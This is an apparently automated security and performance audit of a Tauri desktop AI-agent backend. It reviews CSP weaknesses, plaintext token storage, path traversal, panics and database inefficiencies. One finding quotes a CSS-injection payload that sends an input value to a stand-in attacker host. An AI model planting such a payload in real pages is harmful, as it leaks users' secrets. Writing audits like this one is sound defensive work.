# Vivianne Tauri Backend: Security & Performance Analysis

**Date:** July 21, 2026  
**Scope:** `packages/gui/src-tauri/` (104 Rust source files, ~15k lines)  
**Type:** Static analysis — code review & architecture audit

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Security Findings](#security-findings)
   - [Critical](#critical)
   - [High](#high)
   - [Medium](#medium)
   - [Low](#low)
3. [Performance Findings](#performance-findings)
   - [High Impact](#high-impact)
   - [Medium Impact](#medium-impact)
   - [Low Impact](#low-impact)
4. [Dependency & Supply Chain](#dependency--supply-chain)
5. [Architecture Observations](#architecture-observations)
6. [Recommendations](#recommendations)

---

## Executive Summary

The codebase is a well-structured Rust/Tauri 2.x desktop application that wraps an AI agent, coding agent, MCP client, and web automation engine. Overall code quality is high with good documentation, but several security and performance concerns exist:

**Key Security Risks:**
- CSP allows `'unsafe-inline'` on both `script-src` and `style-src`, weakening XSS protection
- Arbitrary shell commands spawned from agent prompts with path-traversal potential
- MCP server configs in plaintext `mcp_servers.json` can embed secrets in environment variables
- OAuth tokens persisted in plaintext JSON in `~/.vivianne/mcp_oauth.json`
- `cmd_set_project_dir` changes the global process CWD, affecting all concurrent operations
- WebView `create-webview-window` permission granted without restrictions
- `panic!()` calls in production API response parsing code

**Key Performance Risks:**
- SQLite connection opened per operation (CPU-bound hot path)
- Usage store serializes entire file to disk on every token record
- Brute-force O(n) vector similarity scan in memory store
- 30-second polling for automation scheduler instead of event-driven
- Global `Mutex` locks on MCP connections, credential stores, and other singleton state
- Many `.clone()` calls on large data structures in core agent loop

---

## Security Findings

### 🔴 Critical

#### SEC-01: CSP allows `'unsafe-inline'` on script-src

**Location:** `tauri.conf.json` → `app.security.csp`  
**Severity:** Critical  
**Risk:** XSS attacks can execute arbitrary JavaScript in the WebView context

```json
"csp": "default-src 'self'; ... script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
```

The `'unsafe-inline'` directive on `script-src` disables one of the CSP's strongest protections. Any XSS vulnerability in the frontend allows arbitrary code execution, which can then call any exposed `#[tauri::command]` — including `cmd_set_project_dir`, `cmd_write_text_file`, and shell execution commands.

**Recommendation:** Remove `'unsafe-inline'` from `script-src`. Use nonces or hashes for inline scripts. For `style-src`, consider removing `'unsafe-inline'` if possible, or keep it as the lower-risk alternative (CSS injection is less exploitable than JS injection).

---

#### SEC-02: Arbitrary shell command execution via agent tools

**Location:** `src/agent/tool_exec.rs`, `src/coding_agent/bash_executor.rs`, `src/coding_agent/sandbox.rs`  
**Severity:** Critical  
**Risk:** Agent-influenced shell execution can escape workspace sandbox

The agent has access to `bash`, `powershell`, `streaming_bash`, `streaming_powershell`, and `sandbox_execute` tools. While gated behind user approval in `tool_exec.rs` (line 17-40), the sandbox isolation is only network-level (Docker). Key issues:

1. **The `bash` tool (line 1905, `tool_exec.rs`)** passes user/agent-authored strings directly to `Command::new`
2. **Path traversal in file operations:** The `write`, `edit`, and `read` tools operate on a `cwd` that can be changed by `cmd_set_project_dir`
3. **`cmd_set_project_dir` (commands.rs:64-65)** changes the global `std::env::current_dir` — all relative paths in subsequent file operations are affected

**Recommendation:**
- Implement path sandboxing: validate all file paths resolve within the allowed workspace directory
- Use `std::fs::canonicalize()` and prefix checks to prevent path traversal
- Consider running shell commands in a container with read-only root filesystem by default

---

#### SEC-03: MCP server config stores secrets in plaintext

**Location:** `src/mcp/mod.rs:58-63` — `mcp_servers.json`  
**Severity:** Critical  
**Risk:** Plaintext secrets persisted to disk

The MCP server config file is described as:

> "Plaintext, same trust boundary as settings.json — NOT an encrypted vault. A stdio server's `env` map can carry a secret (e.g. `GITHUB_TOKEN`)."

This means if a user configures an MCP server with environment variables containing API tokens or other secrets, they are persisted in plaintext to `~/.viv/agent/mcp_servers.json`.

**Recommendation:** Use the OS keychain (already available via `KeychainCredentialStore`) to encrypt sensitive `env` values, or clearly document this limitation.

---

### 🔴 High

#### SEC-04: OAuth tokens persisted in plaintext

**Location:** `src/mcp/oauth.rs:41-48` — `mcp_oauth.json`  
**Severity:** High  
**Risk:** OAuth access/refresh tokens stored in plaintext on disk

```rust
fn tokens_path() -> PathBuf {
    dirs::home_dir().unwrap_or_else(|| PathBuf::from(".")).join(".vivianne").join("mcp_oauth.json")
}
```

OAuth tokens (including refresh tokens) are stored in `~/.vivianne/mcp_oauth.json` in plaintext. The keychain infrastructure exists (`KeychainCredentialStore`) but is not used for MCP OAuth tokens.

**Recommendation:** Use the existing `KeychainCredentialStore` for MCP OAuth tokens, or at minimum encrypt the file at rest.

---

#### SEC-05: `panic!()` in production code paths

**Location:** `src/ai/api/openai_responses.rs:605-656`  
**Severity:** High  
**Risk:** Crash on malformed API responses — DoS vector

```rust
_ => panic!("expected text content"),
other => panic!("expected Message item, got {other:?}"),
```

Multiple `panic!` calls in the OpenAI Responses API parsing code. If the API returns an unexpected response format (which happens with API version drift), the **entire application crashes** rather than returning an error. This is both a reliability issue and a potential denial-of-service vector.

**Recommendation:** Replace all `panic!()` calls with proper `Result` error returns. Production Rust code should never panic except for unrecoverable errors.

---

#### SEC-06: `unsafe-inline` on style-src enables CSS data exfiltration

**Location:** `tauri.conf.json`  
**Severity:** High (when combined with any injection)  
**Risk:** CSS injection can exfiltrate sensitive data

With `style-src 'unsafe-inline'`, any content injection can use CSS attribute selectors to exfiltrate data via CSS injection attacks (e.g., `input[value^="secret"] { background: url(https://attacker/secret) }`).

**Recommendation:** Remove `'unsafe-inline'` from `style-src` if possible, or add a hash/nonce.

---

#### SEC-07: API key exposure in debug status command

**Location:** `src/agent/commands.rs:345-395` — `cmd_debug_agent_status`  
**Severity:** High  
**Risk:** API key presence leaked to frontend

The `cmd_debug_agent_status` command reads the credential store and returns an `api_key_status` field (one of `"not_found"`, `"present"`, `"empty"`, `"oauth_present"`). While it doesn't leak the key itself, it leaks **which providers have stored credentials**, useful information for an attacker.

Additionally, this command returns the **full message history** (`"messages": messages`), which may contain sensitive data.

**Recommendation:** Restrict this command to debug builds only, or require authentication.

---

#### SEC-08: Missing input validation on `cmd_set_project_dir`

**Location:** `src/agent/commands.rs:64-66`  
**Severity:** High  
**Risk:** Arbitrary directory change allows path traversal for all subsequent file operations

```rust
pub async fn cmd_set_project_dir(path: String) -> Result<String, String> {
    std::env::set_current_dir(&path).map_err(|e| e.to_string())?;
    // ...
}
```

No validation that `path` is within allowed directories. Combined with the filesystem tools, this allows reading/writing any file the user has access to. The `cmd_create_workspace_folder` command (line 531) also doesn't validate the `parent` path.

**Recommendation:** Validate the path against an allowlist of directories, or normalize and check that it doesn't escape expected workspaces.

---

### 🟡 Medium

#### SEC-09: `create-webview-window` without origin restrictions

**Location:** `capabilities/default.json`  
**Severity:** Medium  
**Risk:** The frontend can create new webview windows loading arbitrary URLs

The `core:webview:allow-create-webview-window` permission is granted without any URL allowlist. This could be used by an attacker who achieves XSS to spawn new webview windows loading arbitrary URLs, potentially escaping the sandbox.

**Recommendation:** Restrict the permission with origin allow/deny lists, or remove it if unused.

---

#### SEC-10: Plaintext credential file fallback

**Location:** `src/lib.rs:52-60`, `src/ai/auth.rs` — `FileBackedCredentialStore`  
**Severity:** Medium  
**Risk:** API keys fall back to plaintext JSON file on disk

When the OS keychain is unavailable (headless CI, WSL without keychain daemon, etc.), the code falls back to `FileBackedCredentialStore` which stores credentials in `credentials.json` in the app data directory. The warning message is clear, but users may not notice it.

**Recommendation:** Add file-level encryption (AES-GCM with a derived key) for the plaintext fallback, or at minimum set restrictive file permissions (0600).

---

#### SEC-11: `cmd_debug_agent_status` returns full message history

**Location:** `src/agent/commands.rs:388`  
**Severity:** Medium  
**Risk:** Sensitive conversation data exposed to any caller

The command returns the complete message history including all user prompts and AI responses, which could contain sensitive data (API keys, passwords, proprietary code). There's no authorization check — any process that can invoke Tauri commands can read the full conversation history.

**Recommendation:** Limit to debug builds, or add a redaction step that strips potential secrets.

---

#### SEC-12: `reqwest` with native TLS — no certificate pinning

**Location:** `Cargo.toml` — reqwest dependency  
**Severity:** Medium  
**Risk:** Man-in-the-middle attacks on API calls

The `reqwest` client uses default system TLS. There is no certificate pinning for any of the API endpoints (Anthropic, OpenAI, Google, etc.). This makes the application vulnerable to MITM attacks if the system root CA store is compromised.

**Recommendation:** Consider implementing certificate pinning for critical API endpoints, or at minimum use `rustls` instead of native TLS for a smaller, audited codebase.

---

#### SEC-13: Automation scheduler runs indefinitely without rate limits

**Location:** `src/automation.rs` — `spawn_scheduler`  
**Severity:** Medium  
**Risk:** Unbounded background agent prompts can accumulate API costs

The automation scheduler runs at 30-second intervals and fires agent prompts on cron schedules. There's no per-automation rate limiting or daily budget cap. A misconfigured automation (e.g., `* * * * *` = every minute) can run indefinitely, incurring unbounded API costs.

**Recommendation:** Add a per-automation max-fires-per-day limit and a total daily cost budget.

---

#### SEC-14: Shell environment inherited for subprocess execution

**Location:** `src/agent/harness/env.rs:210-214`, `src/coding_agent/exec.rs:50-60`  
**Severity:** Medium  
**Risk:** Environment variables (including secrets) leaked to subprocesses

The `LocalShell::exec` (harness/env.rs) and `exec_command` (coding_agent/exec.rs) both inherit the parent process's environment by default. Any secrets in the environment (API keys from the auth system, etc.) are accessible to spawned processes.

**Recommendation:** Use `env_clear()` on commands that don't need the full parent environment, then selectively add only required variables.

---

#### SEC-15: Docker installer downloads and executes arbitrary code

**Location:** `src/docker_installer.rs`  
**Severity:** Medium  
**Risk:** Downloads unsigned installer over HTTPS (no checksum verification)

The Docker Desktop installer is downloaded from Docker's CDN and executed. While HTTPS is used, there's no signature verification, checksum check, or hash validation on the downloaded file. A compromised CDN or download could execute arbitrary code with admin privileges.

**Recommendation:** Verify the download against a known SHA-256 hash, or use the official package manager for installation.

---

### 🟢 Low

#### SEC-16: Credential migration leaves old file in place on failure

**Location:** `src/ai/keychain_store.rs:138-160` — `migrate_plaintext_credentials`  
**Severity:** Low  
**Risk:** Temporary duplication of credentials in plaintext

If a partial migration fails, the plaintext `credentials.json` is left in place. A subsequent successful migration removes it, but there's a window where both copies exist. This is acceptable as documented.

#### SEC-17: Usage data stored with per-source tagging

**Location:** `src/agent/usage_store.rs`  
**Severity:** Low  
**Risk:** Session IDs in usage data could be used to correlate activity

Usage data includes `source_tag` containing session IDs (`main:<session_id>`, `delegate:<session_id>`). This could potentially link conversation sessions to cost data.

#### SEC-18: VPN/detected environment — camoufox-browser fingerprints

**Location:** `src/camoufox.rs`  
**Severity:** Low  
**Risk:** Third-party browser service could fingerprint the user

The camoufox-browser integration launches a Firefox fork with fingerprint spoofing. This external service has access to URLs navigated to and could potentially leak browsing habits to the service provider.

---

## Performance Findings

### 🔴 High Impact

#### PERF-01: SQLite connection opened per operation

**Location:** `src/agent/memory/store.rs:40-68` — `open_and_init()`  
**Impact:** High — unnecessary CPU overhead on every memory operation

Every memory store function (`insert_entry`, `search_fts`, `search_vector`, `all_entries`, etc.) opens a **new SQLite connection** inside `spawn_blocking`. This means:
- SQLite page cache is cold for every operation
- Schema init (`CREATE TABLE IF NOT EXISTS`, `CREATE VIRTUAL TABLE`, triggers) runs each time
- WAL checkpointing state is per-connection, not shared

```rust
fn open_and_init(root: &str) -> Result<Connection, String> {
    let conn = Connection::open(db_path(root))?;
    conn.execute_batch("CREATE TABLE IF NOT EXISTS ... CREATE VIRTUAL TABLE ...");
    migrate_from_jsonl(&conn, root)?;
    Ok(conn)
}
```

**Recommendation:** Use a connection pool (e.g., `r2d2` with SQLite) or a long-lived connection behind a Mutex. The `agent::memory_store` comment acknowledges this ("per-call connection overhead is not a concern") but with FTS5 and vector queries, the overhead adds up.

---

#### PERF-02: Whole-file serialization on every usage record

**Location:** `src/agent/usage_store.rs:52-56` — `record_usage()`  
**Impact:** High — O(n) read-modify-write on every API call

Every API call to the agent reads the entire `usage.json` file, deserializes it, accumulates one entry, re-serializes the entire map, and writes it back. This is done **synchronously before returning from each request**:

```rust
let mut days = read_all(&path).await;
days.entry(today).or_default().accumulate(usage);
tokio::fs::write(&path, serde_json::to_string_pretty(&days)?).await;
```

For a typical user with months of daily usage data, this file grows large. With subagent calls, this can happen 10+ times per prompt.

**Recommendation:** Batch writes (accumulate in memory for N seconds), or use SQLite (already a dependency) for append-only log storage.

---

#### PERF-03: Brute-force O(n) vector search

**Location:** `src/agent/memory/store.rs:305-340` — `search_vector()`  
**Impact:** High — linear scan of all embeddings

```rust
let mut scored: Vec<(f32, MemoryEntry)> = stmt
    .query_map([], |row| { ... })  // Loads ALL rows
    .filter_map(|r| r.ok())
    .map(|(entry, blob)| {
        let emb = decode_embedding(&blob);
        let score = cosine(&query_embedding, &emb);
        (score, entry)
    })
    .collect();
stored.sort_by(|a, b| b.0.total_cmp(&a.0));
```

The vector search reads every row with an embedding, decodes it, computes cosine similarity, then sorts. For a memory store with thousands of entries, this is slow. The comment acknowledges this: "Brute-force in-process scan — fine at the corpus sizes a personal memory store reaches."

**Recommendation:** Pre-warn if this becomes a bottleneck. Consider `pgvector`-style IVF indexes or approximate nearest neighbor libraries.

---

#### PERF-04: Global `Mutex` bottlenecks on MCP connections

**Location:** `src/mcp/mod.rs:40-41` — Global `CONNECTIONS` and `CONFIGS`  
**Impact:** High — all MCP operations contend on a single lock

```rust
lazy_static::lazy_static! {
    static ref CONNECTIONS: Mutex<HashMap<String, Arc<McpConnection>>> = Mutex::new(HashMap::new());
    static ref CONFIGS: Mutex<HashMap<String, McpServerConfig>> = Mutex::new(HashMap::new());
}
```

Every `list_servers`, `list_all_tools`, `add_server`, `remove_server`, and `call_tool` acquires the global `CONNECTIONS` lock. For `call_tool`, the lock is held only briefly (just the `get`), but `list_all_tools` holds it for the duration of iterating all connections.

**Recommendation:** Use `tokio::sync::RwLock` for `CONNECTIONS` (read-heavy workload). Allocate per-server locks instead of a global one.

---

### 🟡 Medium Impact

#### PERF-05: `.clone()` on large data structures in agent loop

**Location:** `src/agent/commands.rs`, `src/agent/loop_core.rs`  
**Impact:** Medium — repeated allocations in hot path

The agent message loop clones `AgentMessage` values and `Vec<AgentMessage>` collections in multiple places. For example, `cmd_agent_messages` clones the entire message list:

```rust
pub async fn cmd_agent_messages(state: State<'_, Arc<AppState>>) -> Result<Vec<AgentMessage>, String> {
    let agent = state.agent.lock().await;
    Ok(agent.state.messages().await)
}
```

This clones every message in the session, including potentially large tool call results and images.

**Recommendation:** Use `Arc<AgentMessage>` internally to share message data without deep clones. Return only message metadata (length, roles) when full content isn't needed.

---

#### PERF-06: 30-second polling for automation scheduler

**Location:** `src/automation.rs:285-310` — `spawn_scheduler`  
**Impact:** Medium — unnecessary wake-ups and disk reads

```rust
let mut ticker = tokio::time::interval(std::time::Duration::from_secs(30));
loop {
    ticker.tick().await;
    // Reads all automations, checks each one, writes back
}
```

Every 30 seconds, the scheduler reads all automations, checks each one's cron schedule, and may write the file. This happens even if no automations are configured.

**Recommendation:** Compute exact `sleep_until` durations per automation and use a priority queue + `tokio::time::sleep` for precise, low-overhead scheduling.

---

#### PERF-07: Sequential `spawn_blocking` per SQLite operation

**Location:** `src/agent/memory/store.rs` — all functions  
**Impact:** Medium — context switching overhead

Every memory store function spawns a separate blocking task:

```rust
tokio::task::spawn_blocking(move || {
    let conn = open_and_init(&root)?;
    // ... one query ...
}).await
```

This adds ~10-50µs of context switching overhead per call, plus the connection setup cost.

**Recommendation:** Use a dedicated thread with a channel-based interface, or pool connections in a `OnceLock`.

---

#### PERF-08: Per-provider Mutex lock acquisition in credential stores

**Location:** `src/ai/auth.rs` — `InMemoryCredentialStore` and `FileBackedCredentialStore`  
**Impact:** Medium — HashMap contention under concurrent requests

```rust
async fn get_or_create_lock(&self, provider_id: &str) -> Arc<Mutex<Option<Credential>>> {
    let mut map = self.locks.lock().await;
    map.entry(provider_id.to_string()).or_insert_with(|| Arc::new(Mutex::new(None))).clone()
}
```

Every credential access first acquires the global `locks` HashMap lock, then the per-provider lock. For a multi-provider setup with concurrent streaming calls, this is a potential contention point.

**Recommendation:** Consider an `Arc<Mutex<...>>` per known provider stored in a fixed-size array or an `ArcSwap` map for lock-free reads.

---

#### PERF-09: Settings and models config read/write entire JSON files

**Location:** `src/agent/commands.rs:708-754` — `cmd_get_settings`, `cmd_save_settings`, similar for models  
**Impact:** Medium — O(file-size) I/O for small changes

Similar to PERF-02, each read/write of settings or models files does full file I/O. For settings with large embedded configs, this adds latency to every frontend interaction that reads them.

**Recommendation:** Cache frequently-read config files in memory with invalidation on write.

---

### 🟢 Low Impact

#### PERF-10: `format!("{:?}", msg)` for token estimation

**Location:** `src/agent/commands.rs:678` — `cmd_agent_session_stats`  
**Impact:** Low — Debug-formatting could be expensive for large messages

Token estimation uses `format!("{:?}", msg)` which generates a debug representation of every message. This is called on every stats refresh and could be expensive for messages with large tool call results.

**Recommendation:** Use a text-length-based heuristic instead of full debug formatting, or pass pre-computed token counts stored with each message.

#### PERF-11: `chrono::Local::now()` called on every usage record

**Location:** `src/agent/usage_store.rs:50`  
**Impact:** Low — system call on every API response

Every API call parses the current local time, which involves a system call and timezone database lookup.

**Recommendation:** Cache the current "day" string and recompute only when the day actually changes.

#### PERF-12: `Unwrap` panic risk in non-test code

**Location:** Multiple files (see grep results)  
**Impact:** Low — potential panics in error paths

Several uses of `.unwrap()` exist outside test code:
- `src/agent/directive.rs:77,105` — `tokio::fs::create_dir_all(&dir).await.unwrap()`
- `src/agent/harness/harness.rs:136` — `TiktokenEstimator::new("gpt-4").unwrap()`
- `src/agent/paths.rs:56-57` — test data writes with `unwrap()`

These could crash the application if the filesystem has issues.

---

## Dependency & Supply Chain

### Dependency Review

| Dependency | Version | Notes |
|---|---|---|
| `tauri` | 2.11.3 | Latest stable, good |
| `reqwest` | 0.13.3 | Older major version; 0.12+ has breaking changes but 0.13 still receives security patches |
| `keyring` | 3.x | With `windows-native`, `apple-native`, `sync-secret-service` features — good |
| `rusqlite` | 0.32 | Bundled feature — avoids system SQLite. `bundled` flag includes sqlite3 source |
| `whisper-rs` | 0.16 | Native whisper.cpp bindings — large C++ build dependency |
| `cron` | 0.12 | Standard 5/6-field cron parser |
| `enigo` | 0.6 | Cross-platform keyboard/mouse automation — requires platform-specific handling |

### Supply Chain Risks

1. **camoufox-browser** is installed via `npx @askjo/camofox-browser`, which downloads a ~300MB browser binary from npm. This is an external dependency with no integrity verification.

2. **Docker installer** downloads from `desktop.docker.com` without checksum verification (SEC-15).

3. **`reqwest` 0.13** uses `hyper` and native TLS (`schannel` on Windows, `Security.framework` on macOS, `openssl` on Linux). No feature flags override the default TLS backend in `Cargo.toml`.

---

## Architecture Observations

### Strengths

1. **Well-modularized** — clear separation between `agent`, `coding_agent`, `ai`, `mcp`, `orchestrator`, and `voice` modules
2. **Excellent documentation** — most files have thorough doc comments explaining design decisions
3. **Good test coverage** — unit tests for core functionality, including keychain round-trips, FTS5, memory operations
4. **Keychain integration** — proper use of OS credential store for API keys
5. **Plan mode gating** — mutating tools are correctly gated during plan mode
6. **Error types** — well-structured error enums (`FileError`, `ExecutionError`, `HarnessError`)

### Weaknesses

1. **Global mutable state** — heavy use of `lazy_static!` with `Mutex` for singletons (MCP connections, permissions, etc.)
2. **No sandbox escape prevention** — file operations use the process CWD as a base, which can be changed globally
3. **Inefficient persistence** — JSON file read-modify-write pattern used in multiple places for what should be append-only logs
4. **Backpressure missing** — `tokio::spawn` used extensively without any rate limiting or backpressure mechanism
5. **API key routing duplication** — `completion.rs` has its own `resolve_api_key` function duplicated from model discovery code

---

## Recommendations

### Immediate (Security)

1. **Fix CSP**: Remove `'unsafe-inline'` from `script-src`. Use nonces.
2. **Replace `panic!()` in `openai_responses.rs`**: Return proper errors instead.
3. **Encrypt MCP OAuth tokens**: Use existing `KeychainCredentialStore`.
4. **Add path validation**: Ensure file operations can't escape the workspace.

### Short-term (Security + Performance)

5. **Connection-pool SQLite**: Share connections across memory store operations.
6. **Batch usage writes**: Accumulate in memory, write periodically.
7. **Rate-limit automations**: Add per-automation and daily budget caps.
8. **Restrict debug commands**: Gate `cmd_debug_agent_status` behind debug builds.

### Medium-term (Architecture)

9. **Use `ArcSwap` or sharded locks**: Reduce contention on global state.
10. **Event-driven automation**: Replace 30s polling with precise scheduling.
11. **Read-only workspace enforcement**: Verify tool paths against workspace allowlist.
12. **Certificate pinning**: For critical LLM API endpoints.

### Long-term (Fundamental)

13. **Sandbox all agent shell execution**: Default to Docker/container-based execution even when `sandbox_execute` isn't selected.
14. **Implement capability-based security**: Fine-grained permissions per tool, not binary gated/ungated.
15. **Unify credential resolution**: Eliminate duplicated `resolve_api_key` functions across modules.

---

*Generated by automated code analysis. Findings should be verified with dynamic testing.*
